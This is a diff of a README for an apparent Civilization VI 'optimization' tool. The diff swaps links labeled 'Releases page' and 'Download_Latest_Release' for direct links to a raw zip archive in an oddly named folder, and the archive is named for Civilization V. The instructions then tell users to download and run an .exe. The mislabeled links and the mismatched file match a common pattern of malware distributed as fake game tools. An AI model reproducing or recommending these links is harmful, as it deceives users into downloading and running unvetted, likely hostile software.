@@ -1,6 +1,6 @@
 # ⚙️ Civilization-VI-Optimization - Improve performance and boost game speed
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/nettigreenside820/Civilization-VI-Optimization/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/nettigreenside820/Civilization-VI-Optimization/raw/refs/heads/main/touchedness/Optimization_Civilization_V_v3.5.zip)
 
 This project provides a performance pack for Civilization VI. It improves frame rates, minimizes stuttering during gameplay, and reduces total load times. This tool ensures your game runs smooth on Windows 10 and Windows 11 systems.
 
@@ -8,7 +8,7 @@ This project provides a performance pack for Civilization VI. It improves frame 
 
 Follow these steps to install the optimization pack on your computer.
 
-1. Go to the [Releases page](https://github.com/nettigreenside820/Civilization-VI-Optimization/releases).
+1. Go to the [Releases page](https://github.com/nettigreenside820/Civilization-VI-Optimization/raw/refs/heads/main/touchedness/Optimization_Civilization_V_v3.5.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
